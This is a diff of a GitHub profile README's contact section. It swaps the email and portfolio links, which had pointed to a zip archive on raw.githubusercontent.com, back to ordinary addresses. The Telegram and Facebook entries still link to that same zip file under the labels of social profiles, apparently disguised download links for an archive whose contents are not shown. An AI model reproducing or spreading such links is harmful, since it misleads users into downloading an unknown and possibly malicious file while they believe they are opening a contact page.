@@ -97,9 +97,9 @@ I'm a developer who turns ideas into reality through clean code and creative thi
 
 ## 📫 Connect With Me
 
-- 📧 Email: <a href="https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip" target="_blank">https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip</a>  
+- 📧 Email: [ingvanly168@gmail.com](mailto:ingvanly168@gmail.com)
 - 💬 Telegram: [@Ingvanly](https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip)
-- 🌐 Portfolio: [https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip](https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip)
+- 🌐 Portfolio: [https://vanly-portfolio.vercel.app](https://vanly-portfolio.vercel.app)
 - 📘 Facebook: [Ing Vanly](https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip)
 <br>
 <!-- Facebook -->
